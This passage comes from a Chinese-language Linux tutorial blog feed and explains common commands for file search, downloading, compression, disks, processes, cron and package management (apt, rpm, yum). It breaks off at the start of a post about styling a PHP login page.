管道符</h4><p>管道符，“|”，表示将前一个命令的处理结果输出传递给后面的命令处理，可以前面查出来的东西传给管道符后端的处理，例如 ls | grep -n test</p><p>grep是Linux系统中常用的文本搜索工具，可以在文件中查找指定的字符串或者正则表达式，并将匹配的行输出到终端或者文件中。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># 单个文件中查找</span><br><span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;string&quot;</span> filename<br><br><span class="hljs-comment"># 多个文件中查找字符</span><br><span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;string&quot;</span> file1 file2 file3<br><br><span class="hljs-comment"># 忽略大小写查找指定字符串</span><br><span class="hljs-keyword">grep</span> -i <span class="hljs-string">&quot;string&quot;</span> filename<br><br><span class="hljs-comment">#在目录中递归查找指定字符串  </span><br><span class="hljs-keyword">grep</span> -r <span class="hljs-string">&quot;string&quot;</span> directory<br><br><span class="hljs-comment">#显示匹配行的行号  </span><br><span class="hljs-keyword">grep</span> -n <span class="hljs-string">&quot;string&quot;</span> filename<br><br><span class="hljs-comment">#反向查找不包含指定字符串的行  </span><br><span class="hljs-keyword">grep</span> -v <span class="hljs-string">&quot;string&quot;</span> filename<br><br><span class="hljs-comment">#将匹配的行输出到文件中  </span><br><span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;string&quot;</span> filename &gt; output.txt<br></code></pre></td></tr></table></figure><hr><h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><h4 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">wget https:<span class="hljs-string">//releases.ubuntu.com/20.04.2.0/ubuntu-20.04.2.0-desktop-amd64.iso</span>  <span class="hljs-string">//</span>下载单个文件<br><br>wget -r https:<span class="hljs-string">//cloud-images.ubuntu.com/focal/current/focal-server-cloudimg-amd64.img</span>  <span class="hljs-string">//</span>下载整个目录<br><br>wget <span class="hljs-params">--user=your_username</span> <span class="hljs-params">--password=your_password</span> https:<span class="hljs-string">//example.com/private_file.zip</span>  <span class="hljs-string">//</span>带有用户名密码的下载<br><br>wget -P <span class="hljs-string">/home/user/downloads</span> https:<span class="hljs-string">//example.com/file.zip</span>  <span class="hljs-string">//</span>下载文件并指定保存路径<br><br>wget <span class="hljs-params">--limit-rate=200k</span>   <span class="hljs-string">//</span>限速下载<br><br>wget <span class="hljs-params">--tries=2</span> <span class="hljs-string">//</span>重试<br></code></pre></td></tr></table></figure><h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><p>curl是一个功能强大的命令行工具，用于与网络服务器进行数据传输。它支持多种协议，包括HTTP、HTTPS、FTP、SCP等。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">curl <span class="hljs-keyword">https</span>://example.com <span class="hljs-comment"> //  发送GET请求并打印响应</span><br><br>curl -o output.html <span class="hljs-keyword">https</span>://example.com/page.html  <span class="hljs-comment"> //保存响应到文件</span><br><br>curl -X POST -d <span class="hljs-string">&quot;参数&quot;</span> [<span class="hljs-built_in">URL</span>]<br>例如：<br>curl -X POST -d <span class="hljs-string">&quot;username=admin&amp;password=123456&quot;</span> <span class="hljs-keyword">https</span>://example.com/login <span class="hljs-comment"> //发送POST请求</span><br></code></pre></td></tr></table></figure><h3 id="压缩和解压类"><a href="#压缩和解压类" class="headerlink" title="压缩和解压类"></a>压缩和解压类</h3><h4 id="gzip-gunzip-压缩"><a href="#gzip-gunzip-压缩" class="headerlink" title="gzip&#x2F;gunzip 压缩"></a>gzip&#x2F;gunzip 压缩</h4><p>注意：</p><p>（1）只能压缩文件不能压缩目录<br>（2）不保留原来的文件<br>（3）同时多个文件会产生多个压缩包</p><p>gzip压缩</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">gzip</span> 文件<br><br>gzip lnTest.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699546644107-e6c2a361-b23f-4c66-a243-3900fcd2c60b.png" alt="3ef2214ee8184bd68f724734b46d3975.png"></p><p>gunzip解压缩文件  </p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">gunzip</span> lnTest.txt.gz<br></code></pre></td></tr></table></figure><h4 id="zip-unzip-压缩"><a href="#zip-unzip-压缩" class="headerlink" title="zip&#x2F;unzip 压缩"></a>zip&#x2F;unzip 压缩</h4><p>zip 压缩命令在windows&#x2F;linux都通用，可以压缩目录且保留源文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">zip</span> 压缩文件名.<span class="hljs-built_in">zip</span>  源文件    //<span class="hljs-built_in">zip</span>压缩<br><br><span class="hljs-comment"># 压缩文件</span><br><span class="hljs-built_in">zip</span> lnTest.<span class="hljs-built_in">zip</span> lnTest.txt<br><br><span class="hljs-comment"># -r 压缩文件夹</span><br><span class="hljs-built_in">zip</span> -r  nginx1.<span class="hljs-built_in">zip</span> nginx-<span class="hljs-number">1.21</span><span class="hljs-number">.6</span><br><br>unzip lnTest.<span class="hljs-built_in">zip</span>  //unzip解压<br><br><span class="hljs-comment"># -d 指定解压后文件的存放目录</span><br>unzip lnTest.<span class="hljs-built_in">zip</span> -d /opt<br></code></pre></td></tr></table></figure><h4 id="tar-打包"><a href="#tar-打包" class="headerlink" title="tar 打包"></a>tar 打包</h4><p>tar [选项] XXX.tar.gz 将要打包进去的内容 （功能描述：打包目录，压缩后的文件格式.tar.gz）</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699546687827-d1e561af-0ce6-456b-aa03-9b95e62b31fe.png" alt="3241bddc8e444bf8a3c9cf93d6ba7ad9.png"></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">tar -zcvf 打包的文件名<span class="hljs-string">.tar.gz</span> [源文件]<br><br><span class="hljs-comment"># 多个文件打包</span><br>tar -zcvf houma.tar.gz houge.txt bailongma.txt<br><br><span class="hljs-comment"># 打包文件夹</span><br>tar -zcvf xiyou.tar.gz xiyou/<br><br><span class="hljs-comment"># 解压到当前目录</span><br>tar -zxvf houma.tar.gz<br><span class="hljs-comment"># -C 解压到某个目录下</span><br>tar -zxvf xiyou.tar.gz -C <span class="hljs-string">/opt</span><br><br><br></code></pre></td></tr></table></figure><h3 id="磁盘查看和分区类"><a href="#磁盘查看和分区类" class="headerlink" title="磁盘查看和分区类"></a>磁盘查看和分区类</h3><h4 id="du-查看文件和目录占用的磁盘空间"><a href="#du-查看文件和目录占用的磁盘空间" class="headerlink" title="du 查看文件和目录占用的磁盘空间"></a>du 查看文件和目录占用的磁盘空间</h4><p>du 目录&#x2F;文件 （功能描述：显示目录下每个子目录的磁盘使用情况）</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699546711082-56082309-ab22-4fe9-8740-609692f660ef.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看当前文件总占用</span><br><span class="hljs-built_in">du</span> -sh <br><br><span class="hljs-comment"># 当前目录下所有文件磁盘占用</span><br><span class="hljs-built_in">du</span> -sh *<br><br><span class="hljs-comment"># 某文件夹下所有文件的磁盘占用</span><br><span class="hljs-built_in">du</span> -sh /home/*<br><br><span class="hljs-comment"># -c 显示总和</span><br><span class="hljs-built_in">du</span> -csh /home/*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699546721632-e3fa727c-1c81-4430-a77a-d337d75f6cba.png" alt="b501b1d355034cf8b01997e5799649b5.png"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699546726838-8f9b6940-14b3-472b-981a-0994f3c5f764.png" alt="img"></p><h4 id="df-查看磁盘空间使用情况"><a href="#df-查看磁盘空间使用情况" class="headerlink" title="df 查看磁盘空间使用情况"></a>df 查看磁盘空间使用情况</h4><p>df 选项 （功能描述：列出文件系统的整体磁盘使用量，检查文件系统的磁盘空间占用情况）</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">df -h  <span class="hljs-comment">//查看磁盘使用情况</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699546738334-4a41cbfa-a1b3-4cb5-91fb-30f34a3c7021.png" alt="img"></p><h4 id="lsblk-查看设备挂载情况"><a href="#lsblk-查看设备挂载情况" class="headerlink" title="lsblk 查看设备挂载情况"></a>lsblk 查看设备挂载情况</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">lsblk</span><br><br><span class="hljs-comment"># 查看详细的设备挂载情况，显示文件系统信息</span><br>lsblk -f<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699546762984-6626895b-e04c-4b61-8f54-d5887465c5f9.png" alt="759696b61efe4e38ab55362b14def5f8.png"></p><h4 id="mount-umount-挂载-卸载"><a href="#mount-umount-挂载-卸载" class="headerlink" title="mount&#x2F;umount 挂载&#x2F;卸载"></a>mount&#x2F;umount 挂载&#x2F;卸载</h4><p>对于Linux用户来讲，不论有几个分区，分别分给哪一个目录使用，它总归就是一个根目录、一个独立且唯一的文件结构。</p><p>Linux中每个分区都是用来组成整个文件系统的一部分，它在用一种叫做“挂载”的处理方法，它整个文件系统中包含了一整套的文件和目录，并将一个分区和一个目录联系起来，要载入的那个分区将使它的存储空间在这个目录下获得。</p><p>语法：mount [-t vfstype] [-o options] device dir （功能描述：挂载设备）</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699546792293-647427b3-8b25-4dea-88de-8cda7cf67b34.png" alt="668c07945e454bb1b9ec824f67c4ae72.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 建立挂载点</span><br>mkdir <span class="hljs-regexp">/mnt/</span>cdrom/<br><br><span class="hljs-comment"># 设备/dev/cdrom 挂载到 挂载点 ： /mnt/cdrom 中</span><br>mount -t iso9660 <span class="hljs-regexp">/dev/</span>cdrom <span class="hljs-regexp">/mnt/</span>cdrom<span class="hljs-regexp">/  /</span>/挂载光盘镜像文件 <br><br>umount <span class="hljs-regexp">/mnt/</span>cdrom  <span class="hljs-regexp">//</span>卸载光盘镜像文件<br><br>vi <span class="hljs-regexp">/etc/</span>fstab  <span class="hljs-regexp">//</span>设置开机自动挂载<br></code></pre></td></tr></table></figure><p>添加下面那句后保存退出</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699546835701-9799a1ac-576e-48d1-821c-eed4f1ef9fc6.png" alt="img"></p><h4 id="fdisk分区"><a href="#fdisk分区" class="headerlink" title="fdisk分区"></a>fdisk分区</h4><p>注意：该命令必须在 root 用户下才能使用</p><p>基本语法：</p><p>fdisk -l （功能描述：查看磁盘分区详情）</p><p>fdisk 硬盘设备名 （功能描述：对新增硬盘进行分区操作</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699546887095-ede3b3bc-acc2-4669-ac58-19a5407d9749.png" alt="972b8cf375204a3fa2658e348c44c5e6.png"></p><p> 1）、功能说明  </p><p>Linux 分区</p><p>Device：分区序列</p><p>Boot：引导</p><p>Start：从X磁柱开始</p><p>End：到Y磁柱结束</p><p>Blocks：容量</p><p>Id：分区类型ID</p><p>System：分区类型</p><p>分区操作按键说明</p><p>m：显示命令列表</p><p>p：显示当前磁盘分区</p><p>n：新增分区</p><p>w：写入分区信息并退出</p><p>q：不保存分区信息直接退出</p><h3 id="进程管理类"><a href="#进程管理类" class="headerlink" title="进程管理类"></a>进程管理类</h3><p>进程是正在执行的一个程序或命令，每一个进程都是一个运行的实体，都有自己的地址空间，并占用一定的系统资源。</p><h4 id="ps-查看当前系统进程状态"><a href="#ps-查看当前系统进程状态" class="headerlink" title="ps 查看当前系统进程状态"></a>ps 查看当前系统进程状态</h4><p>ps -ef：列出所有进程的详细信息，包括进程的PID、PPID、CPU占用率、内存占用率等。</p><p>ps aux：与ps -ef类似，但是显示的是所有用户的进程信息。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699547054136-4b171eac-cb6c-43eb-aefc-2b748e6edbe6.png" alt="aa8ee3e3a3254903ab123e10c923af6f.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">ps</span> aux<br><br><span class="hljs-built_in">ps</span> <span class="hljs-literal">-ef</span><br></code></pre></td></tr></table></figure><p>1.ps aux 显示信息说明：</p><p>​    USER：该进程是由哪个用户产生的</p><p>​    PID：进程的 ID 号</p><p>​    %CPU：该进程占用 CPU 资源的百分比，占用越高，进程越耗费资源；</p><p>​    %MEM：该进程占用物理内存的百分比，占用越高，进程越耗费资源；</p><p>​    VSZ：该进程占用虚拟内存的大小，单位 KB；</p><p>​    RSS：该进程占用实际物理内存的大小，单位 KB；</p><p>​    TTY：该进程是在哪个终端中运行的。对于 CentOS 来说，tty1 是图形化终端，</p><p>​    tty2-tty6 是本地的字符界面终端。pts&#x2F;0-255 代表虚拟终端。</p><p>​    STAT：进程状态。常见的状态有：R：运行状态、S：睡眠状态、T：暂停状态、</p><p>​    Z：僵尸状态、s：包含子进程、l：多线程、+：前台显示</p><p>​    START：该进程的启动时间</p><p>​    TIME：该进程占用 CPU 的运算时间，注意不是系统时间</p><p>​    COMMAND：产生此进程的命令名</p><p>2.ps -ef 显示信息说明：</p><p>​    UID：用户 ID</p><p>​    PID：进程 ID</p><p>​    PPID：父进程 ID</p><p>​    C：CPU 用于计算执行优先级的因子。数值越大，表明进程是 CPU 密集型运算，</p><p>​    执行优先级会降低；数值越小，表明进程是 I&#x2F;O 密集型运算，执行优先级会提高</p><p>​    STIME：进程启动的时间</p><p>​    TTY：完整的终端名称</p><p>​    TIME：CPU 时间</p><p>​    CMD：启动进程所用的命令和参数</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ps</span> -ef | <span class="hljs-keyword">grep</span> java<br><span class="hljs-keyword">ps</span> aux | <span class="hljs-keyword">grep</span> java<br><br><span class="hljs-keyword">ps</span> -ef | <span class="hljs-keyword">grep</span> java服务名  //配合<span class="hljs-keyword">grep</span> 查询java进程，查出PID后，就可以杀掉进程了<br><br><br></code></pre></td></tr></table></figure><h4 id="kill-终止进程"><a href="#kill-终止进程" class="headerlink" title="kill 终止进程"></a>kill 终止进程</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># -9 表示强迫进程立即停止</span><br><span class="hljs-built_in">kill</span> -9 5102<br><br><span class="hljs-comment">#通过进程名称杀死进程  </span><br>killall firefox<br><br><span class="hljs-comment"># window杀死进程</span><br>taskkill /f /pid  进程ID<br></code></pre></td></tr></table></figure><h4 id="pstree-查看进程树"><a href="#pstree-查看进程树" class="headerlink" title="pstree 查看进程树"></a>pstree 查看进程树</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 显示进程的 PID</span><br><span class="hljs-attribute">pstree</span> -p<br><span class="hljs-comment"># 显示进程的所属用户</span><br>pstree -u<br></code></pre></td></tr></table></figure><h4 id="top-实时监控系统进程状态"><a href="#top-实时监控系统进程状态" class="headerlink" title="top 实时监控系统进程状态"></a>top 实时监控系统进程状态</h4><p> 参数选项：  </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699547182077-a55e55fa-620a-48ac-8306-fe5430e5a7ba.png" alt="3029b96a7ee947b7bb7b48f9de41bc4a.png"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699547197419-cf6209df-9c73-4354-b907-a8defc554315.png" alt="2f89aac1f7854d6eb5d76411e0f41ed5.png"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699547204483-2642c1ec-8a8f-4798-b5b7-d3ecd8f12ceb.png" alt="74fff9b27d3a44c6a0b49f53756a7ed7.png"></p><p>1.第一行信息为任务队列信息</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699547216224-1553e811-e3f9-4d8c-af78-433c97c75032.png" alt="img"></p><p>2.第二行为进程信息</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699547216171-70ff213d-4c57-452f-8902-fce96a920e5e.png" alt="img"></p><p>3.第三行为 CPU 信息</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699547216207-95e34daa-fb3f-46c2-9f47-054691a5333d.png" alt="img"></p><p>4.第四行为物理内存信息</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699547216177-73be6b9b-efea-4422-8c48-1a75d8f9cbd6.png" alt="img"></p><p>5.第五行为交换分区（swap）信息</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699547216171-f9ec7b63-14f5-4c10-ab51-e5fc62f45da8.png" alt="img"></p><h4 id="netstat显示网络状态和端口占用信息"><a href="#netstat显示网络状态和端口占用信息" class="headerlink" title="netstat显示网络状态和端口占用信息"></a>netstat显示网络状态和端口占用信息</h4><p>使用netstat 通常用来查看端口是否被占用</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">netstat -anp <span class="hljs-string">| grep  进程号或端口号</span><br>netstat –nlp <span class="hljs-string">| grep 端口号</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699547242734-5b0c0e43-9f39-4925-bcc7-a3f8249ad906.png" alt="3593f83a130943a8b82ebb7b49820af6.png"></p><p>window查看</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">netstat -ano <span class="hljs-string">| findstr 端口号</span><br></code></pre></td></tr></table></figure><h4 id="crontab-定时任务设置"><a href="#crontab-定时任务设置" class="headerlink" title="crontab 定时任务设置"></a>crontab 定时任务设置</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">crontab -e</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699547259377-9654ab96-ea2b-43bf-bd30-703bd4448faf.png" alt="ade26cc0653b45b58bd0505b6be567c7.png"></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">systemctl restart crond  <span class="hljs-string">//</span>重新启动 crond 服务<br><br>*<span class="hljs-string">/1</span> * * * * <span class="hljs-string">/bin/echo</span> ”11” &gt;&gt; <span class="hljs-string">/root/bailongma.txt</span>  <span class="hljs-string">//</span>每隔 1 分钟，向<span class="hljs-string">/root/bailongma.txt</span> 文件中添加一个 11 的数字<br></code></pre></td></tr></table></figure><h3 id="软件安装与下载"><a href="#软件安装与下载" class="headerlink" title="软件安装与下载"></a>软件安装与下载</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs csharp">apt-<span class="hljs-keyword">get</span> update  <span class="hljs-comment">//更新下载源</span><br><br><br>常规安装命令  <span class="hljs-comment">//安装软件</span><br>sudo apt-<span class="hljs-keyword">get</span> install &lt;软件名称&gt;<br><br>省略安装<br>sudo apt-<span class="hljs-keyword">get</span> install -y &lt;软件名称&gt;<br><br>重新安装<br>sudo apt-<span class="hljs-keyword">get</span> reinstall &lt;软件名称&gt;<br> 或者：<br>sudo apt-<span class="hljs-keyword">get</span> install --reinstall &lt;软件名称&gt;<br><br><span class="hljs-comment">//升级软件</span><br>sudo apt-<span class="hljs-keyword">get</span> upgrade<br><span class="hljs-meta">#此命令用于从/etc/apt/sources.list中列出的源安装系统上当前安装的所有包的最新版本。</span><br><br>sudo apt-<span class="hljs-keyword">get</span> <span class="hljs-keyword">remove</span> &lt;软件名称&gt;  <span class="hljs-comment">//卸载指定的软件，但保留配置文件</span><br><br>sudo apt-<span class="hljs-keyword">get</span> purge &lt;软件名称&gt;<br>或者：<br>sudo apt-<span class="hljs-keyword">get</span> --purge <span class="hljs-keyword">remove</span> &lt;软件名称&gt;  <span class="hljs-comment">//卸载指定的软件，同时删除配置文件</span><br><br>sudo apt-<span class="hljs-keyword">get</span> autoremove  <span class="hljs-comment">//删除自动安装的软件包，这些软件包当初是为了满足其他软件包对它的依赖关系而安装的，而现在已经不再需要了。</span><br><br> sudo apt-<span class="hljs-keyword">get</span> <span class="hljs-keyword">remove</span> --autoremove &lt;软件名称&gt;  <span class="hljs-comment">// 在执行remove命令时使用--autoremove选项，可以同时删除无用的依赖包，类似在执行完remove命令后再执行一次autoremove命令。</span><br></code></pre></td></tr></table></figure><hr><h2 id="软件包管理"><a href="#软件包管理" class="headerlink" title="软件包管理"></a>软件包管理</h2><h3 id="BPM"><a href="#BPM" class="headerlink" title="BPM"></a>BPM</h3><p>RPM（RedHat Package Manager），RedHat软件包管理工具，类似windows里面的setup.exe是Linux这系列操作系统里面的打包安装工具，它虽然是RedHat的标志，但理念是通用的。</p><p>RPM包的名称格式</p><p>Apache-1.3.23-11.i386.rpm</p><p>​    “apache” 软件名称</p><p>​    “1.3.23-11”软件的版本号，主版本和此版本</p><p>​    “i386”是软件所运行的硬件平台，Intel 32位处理器的统称</p><p>​    “rpm”文件扩展名，代表RPM包</p><h4 id="RPM-安装命令（rpm-ivh）"><a href="#RPM-安装命令（rpm-ivh）" class="headerlink" title="RPM 安装命令（rpm -ivh）"></a>RPM 安装命令（rpm -ivh）</h4><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699547345463-f70b6e21-8d75-44a9-ab0e-5d837dfa8056.png" alt="img"></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">rpm -ivh 包名<span class="hljs-string">.rpm</span><br></code></pre></td></tr></table></figure><h4 id="RPM-查询命令（rpm-qa）"><a href="#RPM-查询命令（rpm-qa）" class="headerlink" title="RPM 查询命令（rpm -qa）"></a>RPM 查询命令（rpm -qa）</h4><p>语法：rpm -qa （功能描述：查询所安装的所有 rpm 软件包）</p><p>由于软件包比较多，一般都会采取过滤。rpm -qa | grep rpm软件包<br>例如：查询firefox软件安装情况</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">rpm -<span class="hljs-keyword">qa</span> |<span class="hljs-keyword">grep</span> firefox<br></code></pre></td></tr></table></figure><h4 id="RPM-卸载命令（rpm-e）"><a href="#RPM-卸载命令（rpm-e）" class="headerlink" title="RPM 卸载命令（rpm -e）"></a>RPM 卸载命令（rpm -e）</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript">rpm -e RPM软件包<br><br><span class="hljs-comment"># 卸载软件时，不检查依赖。这样的话，那些使用该软件包的软件在此之后可能就不能正常工作了。</span><br>rpm -e <span class="hljs-comment">--nodeps 软件包</span><br></code></pre></td></tr></table></figure><h3 id="YUM-仓库配置"><a href="#YUM-仓库配置" class="headerlink" title="YUM 仓库配置"></a>YUM 仓库配置</h3><p>YUM（全称为 Yellow dog Updater, Modified）是一个在 Fedora 和 RedHat 以及 CentOS中的 Shell 前端软件包管理器。基于 RPM 包管理，能够从指定的服务器自动下载 RPM 包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软件包，无须繁琐地一次次下载、安装</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699547396225-eaa187c9-198f-43ab-a733-50c01499224b.png" alt="44f7401922d64459b8fd665a183d433a.png"></p><h4 id="YUM-的常用命令"><a href="#YUM-的常用命令" class="headerlink" title="YUM 的常用命令"></a>YUM 的常用命令</h4><p>语法：yum [选项] [参数]</p><p>选项:</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699547406397-0ddd5dd5-5e4f-4976-b141-8122a5fcaa91.png" alt="img"></p><p> 参数：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699547413928-70bc9001-05b4-4ce8-8b2b-caa56d3133e4.png" alt="img"></p><p>采用 yum 方式安装 firefox  </p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>完善网页</title>
    <link href="/2023/11/15/%E5%AE%8C%E5%96%84%E7%BD%91%E9%A1%B5/"/>
    <url>/2023/11/15/%E5%AE%8C%E5%96%84%E7%BD%91%E9%A1%B5/</url>
    
    <content type="html"><![CDATA[<h3 id="美化index-php登录页面"><a href="#美化index-php登录页面" class="headerlink" title="美化index.php登录页面"></a>美化<em>index.php</em>登录页面</h3><p>利用<code>&lt;div&gt;</code>标签和<code>&lt;style&gt;</code>分别设置窗口的内容和格式</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-11-15_11-04-25.png" alt="Snipaste_2023-11-15_11-04-25"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-11-15_11-07-30.png" alt="Snipaste_2023-11-15_11-07-30"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">body&#123;&#125;  //设置body页面的属性background为设置背景图url为本根目录下的文件 background-repeat为设置背景是否重复  background-size为设置背景大小cover为覆盖页面<br>.login&#123;&#125;   